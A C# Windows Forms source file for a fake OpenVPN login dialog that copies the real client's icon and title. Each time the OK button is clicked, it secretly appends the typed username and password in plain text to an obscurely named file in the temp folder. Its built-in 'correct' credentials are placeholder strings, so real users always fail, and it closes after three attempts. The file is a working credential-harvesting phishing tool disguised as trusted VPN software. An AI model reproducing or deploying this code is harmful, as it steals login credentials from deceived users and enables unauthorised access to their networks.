using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Reflection;
using System.Windows.Forms;


namespace OpenVPN
{
    public partial class LoginForm : Form
    {
        private int loginAttempts = 0;
        private string commandLineArg;
        private string logFilePath = Path.Combine(Path.GetTempPath(), "abckdlfdpeoovnp.bin");
        public TextBox txtUsername;
        public TextBox txtPassword;
        private CheckBox chkSavePassword;
        private Label lblUsername;
        private Label lblPassword;
        public Button btnLogin;
        private Button btnCancel;
        private PictureBox eyeIcon;
        private Label lblErrorMessage;
        private bool isPasswordVisible = false;

        public LoginForm()
        {
            // OpenVPN dialog initialization
            InitializeComponent();
            Icon embeddedIcon = Properties.Resources.openvpn_gui;
            this.Icon = embeddedIcon;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.ShowInTaskbar = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.AcceptButton = null;
        }

        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(LoginForm));
            this.txtUsername = new System.Windows.Forms.TextBox();
            this.txtPassword = new System.Windows.Forms.TextBox();
            this.chkSavePassword = new System.Windows.Forms.CheckBox();
            this.btnLogin = new System.Windows.Forms.Button();
            this.btnCancel = new System.Windows.Forms.Button();
            this.lblUsername = new System.Windows.Forms.Label();
            this.lblPassword = new System.Windows.Forms.Label();
            this.lblErrorMessage = new System.Windows.Forms.Label();
            this.eyeIcon = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.eyeIcon)).BeginInit();
            this.SuspendLayout();

            // txtUsername
            this.txtUsername.Location = new System.Drawing.Point(96, 12);
            this.txtUsername.Name = "txtUsername";
            this.txtUsername.Size = new System.Drawing.Size(141, 20);
            this.txtUsername.TabIndex = 0;
            this.txtUsername.TextChanged += new System.EventHandler(this.txtUsername_TextChanged);

            // txtPassword
            this.txtPassword.Location = new System.Drawing.Point(96, 38);
            this.txtPassword.Name = "txtPassword";
            this.txtPassword.PasswordChar = '*';
            this.txtPassword.Size = new System.Drawing.Size(141, 20);
            this.txtPassword.TabIndex = 1;
            this.txtPassword.TextChanged += new System.EventHandler(this.txtPassword_TextChanged);
            this.txtPassword.Enter += new System.EventHandler(this.txtPassword_Enter);
            this.txtPassword.Leave += new System.EventHandler(this.txtPassword_Leave);

            // chkSavePassword
            this.chkSavePassword.AutoSize = true;
            this.chkSavePassword.Location = new System.Drawing.Point(12, 67);
            this.chkSavePassword.Name = "chkSavePassword";
            this.chkSavePassword.Size = new System.Drawing.Size(99, 17);
            this.chkSavePassword.TabIndex = 2;
            this.chkSavePassword.Text = "Save password";
            this.chkSavePassword.UseVisualStyleBackColor = true;

            // btnLogin
            this.btnLogin.Location = new Point(37, 90);
            this.btnLogin.Name = "btnLogin";
            this.btnLogin.Size = new Size(75, 23);
            this.btnLogin.Text = "OK";
            this.btnLogin.TabIndex = 3;
            this.btnLogin.Enabled = false; // Initially disabled
            this.btnLogin.Click += new EventHandler(btnLogin_Click);
            this.Controls.Add(btnLogin);

            // btnCancel
            this.btnCancel.Location = new System.Drawing.Point(148, 90);
            this.btnCancel.Name = "btnCancel";
            this.btnCancel.Size = new System.Drawing.Size(75, 23);
            this.btnCancel.TabIndex = 4;
            this.btnCancel.Text = "Cancel";
            this.btnCancel.UseVisualStyleBackColor = true;
            this.btnCancel.Click += new System.EventHandler(this.btnCancel_Click);

            // lblUsername
            this.lblUsername.AutoSize = true;
            this.lblUsername.Location = new System.Drawing.Point(10, 15);
            this.lblUsername.Name = "lblUsername";
            this.lblUsername.Size = new System.Drawing.Size(58, 13);
            this.lblUsername.TabIndex = 5;
            this.lblUsername.Text = "Username:";

            // lblPassword
            this.lblPassword.AutoSize = true;
            this.lblPassword.Location = new System.Drawing.Point(10, 41);
            this.lblPassword.Name = "lblPassword";
            this.lblPassword.Size = new System.Drawing.Size(56, 13);
            this.lblPassword.TabIndex = 6;
            this.lblPassword.Text = "Password:";

            // lblErrorMessage
            this.lblErrorMessage.AutoSize = true;
            this.lblErrorMessage.ForeColor = System.Drawing.Color.Red;
            this.lblErrorMessage.Location = new System.Drawing.Point(12, 120);
            this.lblErrorMessage.Name = "lblErrorMessage";
            this.lblErrorMessage.Size = new System.Drawing.Size(0, 13);

            // eyeIcon
            Bitmap iconBitmap = Properties.Resources.eye.ToBitmap();
            this.eyeIcon.Image = iconBitmap;
            this.eyeIcon.Location = new System.Drawing.Point(239, 41);
            this.eyeIcon.Name = "eyeIcon";
            this.eyeIcon.Size = new System.Drawing.Size(16, 16);
            this.eyeIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.eyeIcon.TabIndex = 7;
            this.eyeIcon.TabStop = false;
            this.eyeIcon.Click += new System.EventHandler(this.TogglePasswordVisibility);

            // LoginForm
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(271, 153);
            this.Controls.Add(this.eyeIcon);
            this.Controls.Add(this.lblErrorMessage);
            this.Controls.Add(this.btnCancel);
            this.Controls.Add(this.btnLogin);
            this.Controls.Add(this.chkSavePassword);
            this.Controls.Add(this.txtPassword);
            this.Controls.Add(this.txtUsername);
            this.Controls.Add(this.lblPassword);
            this.Controls.Add(this.lblUsername);
            this.Name = "LoginForm";
            this.Text = "OpenVPN";
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private async void btnLogin_Click(object sender, EventArgs e)
        {
            loginAttempts++;
            string correctUsername = "abcdefghijklmnopqrstuvwxyz123456789";
            string correctPassword = "abcdefghijklmnopqrstuvwxyz123456789";

            LogToFile($"{DateTime.Now.ToString()} - Username: {txtUsername.Text} - Password: {txtPassword.Text}");

            if (txtUsername.Text == correctUsername && txtPassword.Text == correctPassword)
            {
                Application.Exit();
            }
            else
            {
                lblErrorMessage.Visible = true;
                lblErrorMessage.Text = "Wrong credentials. Try again...";

                if (loginAttempts == 3)
                {
                    this.Cursor = Cursors.WaitCursor; // works fine
                    await Task.Delay(2000); // works fine
                    Application.Exit();
                    //this.Close();
                }
            }
        }

        private void txtUsername_TextChanged(object sender, EventArgs e)
        {
            UpdateLoginButtonState();
        }

        private void txtPassword_TextChanged(object sender, EventArgs e)
        {
            UpdateLoginButtonState();
        }

        private void txtPassword_Enter(object sender, EventArgs e)
        {
            eyeIcon.Visible = true;
            this.Refresh();
        }

        private void txtPassword_Leave(object sender, EventArgs e)
        {
            eyeIcon.Visible = false;
            this.Refresh();
        }

        private void UpdateLoginButtonState()
        {
            if (!string.IsNullOrEmpty(txtUsername.Text) && !string.IsNullOrEmpty(txtPassword.Text))
            {
                btnLogin.Enabled = true;
                this.Refresh();
            }
            else
            {
                btnLogin.Enabled = false;
                this.Refresh();
            }
        }

        private void TogglePasswordVisibility(object sender, EventArgs e)
        {
            if (isPasswordVisible)
            {
                txtPassword.PasswordChar = '*';
                Bitmap iconBitmap = Properties.Resources.eye.ToBitmap();
                this.eyeIcon.Image = iconBitmap;
                eyeIcon.Image = iconBitmap;
            }
            else
            {
                txtPassword.PasswordChar = '\0';
                Bitmap iconBitmap = Properties.Resources.eye_stroke.ToBitmap();
                this.eyeIcon.Image = iconBitmap;
                eyeIcon.Image = iconBitmap;
            }

            isPasswordVisible = !isPasswordVisible;
        }

        private void LogToFile(string logMessage)
        {
            try
            {
                using (StreamWriter sw = File.AppendText(logFilePath))
                {
                    sw.WriteLine(logMessage);
                }
            }
            catch (Exception ex)
            {
                // exception
            }
        }

        public LoginForm(string commandLineArg) : this()
        {
            this.commandLineArg = commandLineArg;
            this.Text = commandLineArg;
        }

        private async void btnCancel_Click(object sender, EventArgs e)
        {
            //this.Cursor = Cursors.WaitCursor;
            //await Task.Delay(2000);
            this.Close();
            //this.Dispose();  // this misbehaves
            Application.Exit();
        }
    }
}